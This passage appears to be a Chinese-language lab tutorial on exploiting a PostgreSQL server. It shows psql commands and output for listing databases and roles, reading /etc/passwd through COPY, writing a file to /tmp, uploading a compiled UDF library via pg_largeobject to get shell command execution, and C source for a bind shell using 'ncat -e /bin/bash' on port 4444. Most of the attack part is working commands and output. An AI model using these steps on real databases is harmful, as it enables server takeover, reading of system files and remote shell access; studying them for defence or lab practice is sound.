      \x [on|off|auto]       toggle expanded output (currently off)
    Connection
      \c[onnect] {[DBNAME|- USER|- HOST|- PORT|-] | conninfo}
                             connect to new database (currently "postgres")
      \encoding [ENCODING]   show or set client encoding
      \password [USERNAME]   securely change the password for a user
      \conninfo              display information about current connection
    Operating System
      \cd [DIR]              change the current working directory
      \setenv NAME [VALUE]   set or unset environment variable
      \timing [on|off]       toggle timing of commands (currently off)
      \! [COMMAND]           execute command in shell or start interactive shell
    Variables
      \prompt [TEXT] NAME    prompt user to set internal variable
      \set [NAME [VALUE]]    set internal variable, or list all if no parameters
      \unset NAME            unset (delete) internal variable
    Large Objects
      \lo_export LOBOID FILE
      \lo_import FILE [COMMENT]
      \lo_list
      \lo_unlink LOBOID      large object operations
* * *
##### 列出数据库列表
    postgres=# \l
                                      List of databases
       Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
    -----------+----------+----------+-------------+-------------+-----------------------     msfdb     | msfuser  | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
     postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
     template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
               |          |          |             |             | postgres=CTc/postgres
     template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
               |          |          |             |             | postgres=CTc/postgres
    (4 rows)
* * *
##### 列出数据库用户列表
    postgres=# \du
                                 List of roles
     Role name |                   Attributes                   | Member of
    -----------+------------------------------------------------+-----------     msfuser   |                                                | {}
     postgres  | Superuser, Create role, Create DB, Replication | {}
Please try more details about postgresql database.
* * *
#### 列出目录列表
    postgres=# select pg_ls_dir('/etc');
    ERROR:  absolute path not allowed
    postgres=# select pg_ls_dir('./');
          pg_ls_dir       
    ----------------------     postmaster.opts
     postmaster.pid
     pg_logical
     pg_clog
     postgresql.auto.conf
     pg_hba.conf
     cmd.so
     pg_multixact
     postgresql.conf
     pg_ident.conf
     global
     pg_stat_tmp
     PG_VERSION
     pg_dynshmem
     pg_twophase
     pg_xlog
     pg_notify
     pg_snapshots
     pg_tblspc
     pg_serial
     pg_stat
     base
     pg_subtrans
     pg_replslot
    (24 rows)
* * *
#### 文件读取
**方法一**
    postgres=# select pg_read_file('postgresql.conf', 0, 200);
                    pg_read_file                
    --------------------------------------------     # -----------------------------           +
     # PostgreSQL configuration file           +
     # -----------------------------           +
     #                                         +
     # This file consists of lines of the form:+
     #                                         +
     #   name = value                          +
     #                                         +
     # (The "=" is optional.)  Whitespace m
    (1 row)
**方法二**
    postgres=# drop table pwn;
    ERROR:  table "pwn" does not exist
    postgres=# CREATE TABLE pwn(t TEXT);
    CREATE TABLE
    postgres=# COPY pwn FROM '/etc/passwd';
    COPY 27
    postgres=# SELECT * FROM pwn limit 1 offset 0;
                    t                
    ---------------------------------     root:x:0:0:root:/root:/bin/bash
    (1 row)
    postgres=# SELECT * FROM pwn;
                                          t                                       
    ------------------------------------------------------------------------------     root:x:0:0:root:/root:/bin/bash
     bin:x:1:1:bin:/bin:/usr/bin/nologin
     daemon:x:2:2:daemon:/:/usr/bin/nologin
     mail:x:8:12:mail:/var/spool/mail:/usr/bin/nologin
     ftp:x:14:11:ftp:/srv/ftp:/usr/bin/nologin
     http:x:33:33:http:/srv/http:/usr/bin/nologin
     uuidd:x:68:68:uuidd:/:/usr/bin/nologin
     dbus:x:81:81:dbus:/:/usr/bin/nologin
     nobody:x:99:99:nobody:/:/usr/bin/nologin
     systemd-journal-gateway:x:191:191:systemd-journal-gateway:/:/usr/bin/nologin
     systemd-timesync:x:192:192:systemd-timesync:/:/usr/bin/nologin
     systemd-network:x:193:193:systemd-network:/:/usr/bin/nologin
     systemd-bus-proxy:x:194:194:systemd-bus-proxy:/:/usr/bin/nologin
     systemd-resolve:x:195:195:systemd-resolve:/:/usr/bin/nologin
     systemd-journal-remote:x:999:999:systemd Journal Remote:/:/sbin/nologin
     systemd-journal-upload:x:998:998:systemd Journal Upload:/:/sbin/nologin
     avahi:x:84:84:avahi:/:/bin/false
     polkitd:x:102:102:Policy Kit Daemon:/:/bin/false
     git:x:997:997:git daemon user:/:/bin/bash
     colord:x:124:124::/var/lib/colord:/bin/false
     postgres:x:88:88:PostgreSQL user:/var/lib/postgres:/bin/bash
     lab:x:1000:1000::/home/notfound:/bin/bash
     stunnel:x:16:16::/var/run/stunnel:/bin/false
     dnsmasq:x:996:996:dnsmasq daemon:/:/usr/bin/nologin
     mongodb:x:995:2::/var/lib/mongodb:/bin/bash
     mysql:x:89:89::/var/lib/mysql:/bin/false
     sslh:x:994:994::/:/sbin/nologin
    (27 rows)
    postgres=# DROP table pwn;
* * *
#### 写入文件
    postgres=# DROP TABLE pwn;
    DROP TABLE
    postgres=# CREATE TABLE pwn (t TEXT);
    CREATE TABLE
    postgres=# INSERT INTO pwn(t) VALUES ('');
    INSERT 0 1
    postgres=# SELECT * FROM pwn;
                   t                
    --------------------------------     
    (1 row)
    postgres=# COPY pwn(t) TO '/tmp/cmd.php';
    COPY 1
    postgres=# DROP TABLE pwn;
    DROP TABLE
* * *
#### UDF hack
##### 编译源
    lab: / $ git clone https://github.com/sqlmapproject/udfhack/
    lab: / $ gcc lib_postgresqludf_sys.c -I`pg_config --includedir-server` -fPIC -shared -o udf64.so
    lab: / $ gcc -Wall -I/usr/include/postgresql/server -Os -shared lib_postgresqludf_sys.c -fPIC -o lib_postgresqludf_sys.so
    lab: / $ strip -sx lib_postgresqludf_sys.so
##### 命令执行
把udf.so转换为十六进制字符串。
    lab:~/ $ cat udf.so | hex
利用数据库特性上传udf.so。
    postgres=# INSERT INTO pg_largeobject (loid, pageno, data) VALUES (19074, 0, decode('079c...', 'hex'));
    INSERT 0 1
    postgres=# SELECT lo_export(19074, 'cmd.so');
    ERROR:  pg_largeobject entry for OID 19074, page 0 has invalid data field size 3213
    postgres=# SELECT setting FROM pg_settings WHERE name='data_directory';
            setting         
    ------------------------     /var/lib/postgres/data
    (1 row)
Library类库太大了，我们需要把它分成几块，详情可以查看.
    postgres=# select * from pg_largeobject;
     loid | pageno | data
    ------+--------+------    (0 rows)
    postgres=# SELECT setting FROM pg_settings WHERE name='data_directory';
            setting         
    ------------------------     /var/lib/postgres/data
    (1 row)
    postgres=# SELECT lo_creat(-1);
     lo_creat
    ----------        19075
    (1 row)
    postgres=# SELECT lo_create(11122);
     lo_create
    -----------         11122
    (1 row)
    postgres=# select * from pg_largeobject;
     loid | pageno | data
    ------+--------+------    (0 rows)
    postgres=# INSERT INTO pg_largeobject VALUES (11122, 0, decode('079c...', 'hex'));
    INSERT 0 1
    postgres=# INSERT INTO pg_largeobject VALUES (11122, 1, decode('a28e...', 'hex'));
    INSERT 0 1
    postgres=# INSERT INTO pg_largeobject VALUES (11122, 2, decode('1265...', 'hex'));
    INSERT 0 1
    postgres=# INSERT INTO pg_largeobject VALUES (11122, 3, decode('c62e...', 'hex'));
    INSERT 0 1
    postgres=# SELECT lo_export(11122, '/tmp/cmd.so');
     lo_export
    -----------             1
    (1 row)
    postgres=# SELECT lo_unlink(11122);
     lo_unlink
    -----------             1
    (1 row)
成功上传library类库, 然后创建postgresql函数.
    postgres=# CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int4 AS '/tmp/udf64.so', 'sys_exec' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
    CREATE FUNCTION
    postgres=# CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/udf64.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
    CREATE FUNCTION
用 **sys_exec** 执行命令, 然后什么也没有返回.
    postgres=# SELECT sys_exec('id');
     sys_exec
    ----------            0
    (1 row)
执行命令后，清除函数。
    postgres=# DROP FUNCTION sys_exec(text);
    DROP FUNCTION
    postgres=# DROP FUNCTION sys_eval(text);
    DROP FUNCTION
##### 绑定shell
    // bind shell on port 4444
    #include "postgres.h"
    #include "fmgr.h"
    #include 
    #ifdef PG_MODULE_MAGIC
    PG_MODULE_MAGIC;
    #endif
    text *exec()
    {
        system("ncat -e /bin/bash -l -p 4444");
    }
编译源码
    lab:postgres_cmd/ $  vim nc.c
    lab:postgres_cmd/ $  gcc nc.c -I`pg_config --includedir-server` -fPIC -shared -o nc.so
    lab:postgres_cmd/ $  strip -sx nc.so
复制nc.so到postgresql的tmp目录, 或者你可以利用数据库特性上传so文件.
    lab:postgres_cmd/ $  sudo cp nc.so /tmp/systemd-private-374c1bd49d5f425ca21cca8cc6d89de7-postgresql.service-SKrVjI/tmp/nc.so
为绑定shell创建执行函数，用客户端连接到目标.
    postgres=# CREATE OR REPLACE FUNCTION exec() RETURNS text AS  '/tmp/nc.so', 'exec' LANGUAGE C STRICT;
    CREATE FUNCTION